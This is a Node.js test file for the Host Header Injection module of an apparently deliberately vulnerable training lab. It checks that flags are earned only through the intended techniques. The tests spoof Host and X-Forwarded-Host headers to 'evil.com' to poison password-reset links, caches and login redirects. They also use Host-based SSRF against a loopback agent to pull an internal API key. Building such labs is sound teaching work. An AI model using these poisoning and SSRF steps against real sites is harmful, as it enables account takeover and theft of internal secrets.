'use strict';
// Host Header Injection module: every challenge must be solvable by the
// documented technique and must NOT be solvable by the obvious shortcut.
//
// Note on spoofing Host in tests: fetch/undici silently drops the Host
// header (it is a forbidden header name), so requests that need a spoofed
// Host go through node:http below, sharing the same cookie jar as the
// fetch-based client. X-Forwarded-Host is not forbidden, so the plain
// client handles those.
const test = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

// Requests with a genuinely spoofed Host header, sharing the fetch
// client's cookie jar (same student session).
function spoofed(c, base, host) {
  const u = new URL(base);
  function req(method, path, { form, headers } = {}) {
    return new Promise((resolve, reject) => {
      const body = form ? new URLSearchParams(form).toString() : undefined;
      const reqHeaders = {
        host,
        ...(c.cookie() ? { cookie: c.cookie() } : {}),
        ...(form
          ? {
              'content-type': 'application/x-www-form-urlencoded',
              'content-length': String(Buffer.byteLength(body)),
            }
          : {}),
        ...headers,
      };
      const r = http.request(
        { host: u.hostname, port: Number(u.port), path, method, headers: reqHeaders },
        (res) => {
          let data = '';
          res.on('data', (ch) => { data += ch; });
          res.on('end', () => {
            for (const sc of res.headers['set-cookie'] || []) {
              const pair = sc.split(';')[0];
              const name = pair.split('=')[0];
              c.setCookie(
                c.cookie().split('; ').filter((p) => p && !p.startsWith(name + '=')).concat(pair).join('; ')
              );
            }
            resolve({ status: res.statusCode, text: data, headers: res.headers });
          });
        }
      );
      r.on('error', reject);
      if (body) r.write(body);
      r.end();
    });
  }
  return {
    get: (path, headers) => req('GET', path, { headers }),
    post: (path, form, headers) => req('POST', path, { form, headers }),
  };
}

test('hostheader module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'hostheader', id);

  const pullToken = (text) => {
    const m = text.match(/reset\?token=([0-9a-f]{32})/);
    assert.ok(m, 'reset token rendered on the page');
    return m[1];
  };

  await t.test('module page renders, links resolve, no em dash', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/hostheader');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash in page');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 5);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    for (const href of ['/hostheader/forgot', '/hostheader/app', '/hostheader/status', '/hostheader/forgot-xfwd', '/hostheader/login', '/hostheader/evil-collect', '/hostheader/reset?token=missing']) {
      const r = await c.get(href);
      assert.notEqual(r.status, 404, href);
    }
  });

  await t.test('host-reset-poison: poisoned Host earns the flag, legitimate host does not', async () => {
    const legit = client(srv.base);
    const legitPage = await legit.post('/hostheader/forgot', { email: 'alice@pentrix.lab' });
    assert.equal(legitPage.status, 200);
    const legitToken = pullToken(legitPage.text);
    const legitColl = await legit.get('/hostheader/evil-collect?token=' + legitToken);
    assert.ok(!legitColl.text.includes(flagOf('host-reset-poison')), 'a token issued for the legit host must not award');

    const c = client(srv.base);
    const evil = spoofed(c, srv.base, 'evil.com');
    const poisonPage = await evil.post('/hostheader/forgot', { email: 'alice@pentrix.lab' });
    assert.equal(poisonPage.status, 200);
    assert.ok(poisonPage.text.includes('http://evil.com/hostheader/reset'), 'reset link must be built from the poisoned Host');
    const token = pullToken(poisonPage.text);
    const coll = await c.get('/hostheader/evil-collect?token=' + token);
    assert.ok(coll.text.includes(flagOf('host-reset-poison')), 'a poisoned token at the collector must award');
    assert.ok((await capturedSet(c)).includes('hostheader:Password Reset Poisoning'));
  });

  await t.test('host-cache-poison: poisoned entry served to a normal host earns the flag', async () => {
    const c = client(srv.base);
    await c.get('/hostheader/app/clear');
    await c.get('/hostheader/app');
    const plain = await c.get('/hostheader/app');
    assert.ok(!plain.text.includes(flagOf('host-cache-poison')), 'an unpoisoned cache must not award');

    await c.get('/hostheader/app/clear');
    const evil = spoofed(c, srv.base, 'evil.com');
    await evil.get('/hostheader/app');
    const hit = await c.get('/hostheader/app');
    assert.ok(hit.text.includes('http://evil.com/hostheader/forgot'), 'the cache still serves the poisoned page');
    assert.ok(hit.text.includes(flagOf('host-cache-poison')), 'a normal host seeing the poisoned cache entry must award');

    // P1-1: the poison lives in the poisoning session's cache only. A fresh
    // session is served a clean page and earns nothing from it.
    const stranger = client(srv.base);
    const fresh = await stranger.get('/hostheader/app');
    assert.ok(!fresh.text.includes('http://evil.com/hostheader/forgot'), 'another session must not be served this session\'s poison');
    assert.ok(!fresh.text.includes(flagOf('host-cache-poison')), 'a fresh visitor must not earn the flag from someone else\'s poison');
  });

  await t.test('host-ssrf: pointing the server fetch at the loopback agent earns the flag', async () => {
    const c = client(srv.base);
    const benign = await c.get('/hostheader/status');
    assert.equal(benign.status, 200);
    assert.ok(!benign.text.includes(flagOf('host-ssrf')), 'fetching the public metrics must not award');
    // The internal agent takes a per-instance loopback port; the page names it.
    const m = benign.text.match(/127\.0\.0\.1:(\d+)<\/code> \(loopback only\)/);
    assert.ok(m, 'the status page must name the internal agent address');
    const agent = spoofed(c, srv.base, '127.0.0.1:' + m[1]);
    const hit = await agent.get('/hostheader/status');
    assert.ok(hit.text.includes('ak-internal-'), 'the server reached the internal agent');
    assert.ok(hit.text.includes(flagOf('host-ssrf')), 'exfiltrating the internal agent secrets must award');
    assert.ok((await capturedSet(c)).includes('hostheader:SSRF via Host Header'));
  });

  await t.test('host-ssrf: a stand-in server returning the marker text earns nothing', async () => {
    // The cheat: point the Host at the student's own server that parrots the
    // internal marker text. The body matches, but the response carries no
    // internal-agent seal, so the award must not fire.
    const { freePort } = require('./helpers');
    const standin = http.createServer((req, res) => {
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify({ service: 'fake', admin_api_key: 'ak-internal-7f3a9c2e' }));
    });
    const port = await freePort();
    await new Promise((resolve) => standin.listen(port, '127.0.0.1', resolve));
    t.after(() => new Promise((resolve) => standin.close(resolve)));
    const c = client(srv.base);
    const evil = spoofed(c, srv.base, '127.0.0.1:' + port);
    const hit = await evil.get('/hostheader/status');
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes('ak-internal-'), 'the stand-in body was fetched');
    assert.ok(!hit.text.includes(flagOf('host-ssrf')), 'marker text alone must not award');
    assert.ok(!(await capturedSet(c)).includes('hostheader:SSRF via Host Header'));
  });

  await t.test('host-xforwarded: poisoned X-Forwarded-Host or X-Host-Override earns the flag, unpoisoned does not', async () => {
    const c = client(srv.base);
    const legitPage = await c.post('/hostheader/forgot-xfwd', { email: 'alice@pentrix.lab' });
    const legitToken = pullToken(legitPage.text);
    const legitColl = await c.get('/hostheader/evil-collect?token=' + legitToken);
    assert.ok(!legitColl.text.includes(flagOf('host-xforwarded')), 'an unpoisoned forwarded-host must not award');

    const poisonPage = await c.post('/hostheader/forgot-xfwd', { email: 'alice@pentrix.lab' }, { 'x-forwarded-host': 'evil.com' });
    assert.ok(poisonPage.text.includes('http://evil.com/hostheader/reset'), 'reset link must be built from X-Forwarded-Host');
    const token = pullToken(poisonPage.text);
    const coll = await c.get('/hostheader/evil-collect?token=' + token);
    assert.ok(coll.text.includes(flagOf('host-xforwarded')), 'X-Forwarded-Host poisoning must award');

    const overridePage = await c.post('/hostheader/forgot-xfwd', { email: 'bob@pentrix.lab' }, { 'x-host-override': 'evil.org' });
    const overrideToken = pullToken(overridePage.text);
    const overrideColl = await c.get('/hostheader/evil-collect?token=' + overrideToken);
    assert.ok(overrideColl.text.includes(flagOf('host-xforwarded')), 'X-Host-Override poisoning must award');
  });

  await t.test('host-abs-url: login under a poisoned Host earns the flag via the 302', async () => {
    const c = client(srv.base);
    const legit = await c.post('/hostheader/login', { username: 'alice', password: 'alice123' });
    assert.equal(legit.status, 302);
    assert.ok(!legit.text.includes(flagOf('host-abs-url')), 'login under the normal host must not award');

    const evil = spoofed(c, srv.base, 'evil.com');
    const hit = await evil.post('/hostheader/login', { username: 'alice', password: 'alice123' });
    assert.equal(hit.status, 302);
    assert.ok(String(hit.headers.location).startsWith('http://evil.com/'), 'the 302 Location must be built from the poisoned Host');
    assert.ok(hit.text.includes(flagOf('host-abs-url')), 'a login redirect to the attacker host must award');
  });

  await t.test('scoreboard counts each captured challenge once', async () => {
    const c = client(srv.base);
    const evil = spoofed(c, srv.base, 'evil.com');

    const t1 = pullToken((await evil.post('/hostheader/forgot', { email: 'a@pentrix.lab' })).text);
    await c.get('/hostheader/evil-collect?token=' + t1);
    await c.get('/hostheader/evil-collect?token=' + t1); // repeated capture of the same challenge

    const t2 = pullToken((await c.post('/hostheader/forgot-xfwd', { email: 'a@pentrix.lab' }, { 'x-forwarded-host': 'evil.com' })).text);
    await c.get('/hostheader/evil-collect?token=' + t2);

    await c.get('/hostheader/app/clear');
    await evil.get('/hostheader/app');
    await c.get('/hostheader/app');

    const agentPort = (await c.get('/hostheader/status')).text.match(/127\.0\.0\.1:(\d+)<\/code> \(loopback only\)/)[1];
    await spoofed(c, srv.base, '127.0.0.1:' + agentPort).get('/hostheader/status');
    await evil.post('/hostheader/login', { username: 'alice', password: 'alice123' });

    const got = (await capturedSet(c)).filter((s) => s.startsWith('hostheader:')).sort();
    assert.deepEqual(got, [
      'hostheader:Absolute Continue URL',
      'hostheader:Cache Poisoning via Host',
      'hostheader:Forwarded-Host Header Poisoning',
      'hostheader:Password Reset Poisoning',
      'hostheader:SSRF via Host Header',
    ]);
  });
});
